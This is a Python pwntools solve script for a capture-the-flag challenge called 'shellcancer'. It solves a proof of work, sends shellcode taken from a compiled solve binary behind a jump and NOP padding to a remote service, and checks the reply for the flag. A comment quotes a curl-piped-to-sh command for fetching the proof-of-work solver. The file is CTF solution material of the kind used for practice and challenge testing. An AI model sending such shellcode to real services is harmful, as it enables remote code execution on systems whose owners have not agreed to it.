#!/usr/bin/env python3
from pwn import context, ELF, asm, flat, log, remote, logging
from re import findall
from pathlib import Path
from argparse import ArgumentParser


logging.disable()


exe = context.binary = ELF(Path(__file__).parent.parent / "src" / "shellcancer")
solve = ELF(Path(__file__).parent / "solve")


def do_pow(io):
    import string
    import subprocess
    io.recvuntil(b"proof of work:\n")
    data = io.recvline().split(b" -s ")[-1].decode()[:-1]
    # check that data is letter.base64.base64
    assert len(data.split(".")) == 3
    assert data.split(".")[0] in string.ascii_letters
    base64letters = string.ascii_letters + string.digits + "+/="
    assert all(d in base64letters for d in data.split(".")[1])
    assert all(d in base64letters for d in data.split(".")[2])
    # get pow by running "curl -sSfL https://pwn.red/pow | sh -s <data>"
    pow_file = Path(__file__).parent / "pow.sh"
    pow = subprocess.check_output(f"{pow_file} {data}", shell=True).strip()
    io.sendlineafter(b"solution: ", pow)


def main(hostname, port):
    io = remote(hostname, port)
    do_pow(io)
    shellcode = solve.read(solve.entrypoint & ~0xfff, 0xd00)
    entry = solve.entrypoint - solve.address - 0x1000
    log.info(f"{entry = :}")
    off = 0x20
    io.send(flat({
        0x0: asm(f"""jmp $+{entry+off}"""),
        off: shellcode,
    }, filler=b"\x90"*100))

    while True:
        try:
            data = io.recv(timeout=2)
            found = findall(rb"ifctf{[^\}]+}", data)
            for flag in found:
                print("OK - successfully read flag")
                exit(0)
        except EOFError:
            break
    io.close()
    print("ERR - Failed to read flag")
    exit(1)


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('--hostname', type=str, default="localhost")
    parser.add_argument('--port', type=int, default=10002)
    args = parser.parse_args()
    main(args.hostname, args.port)
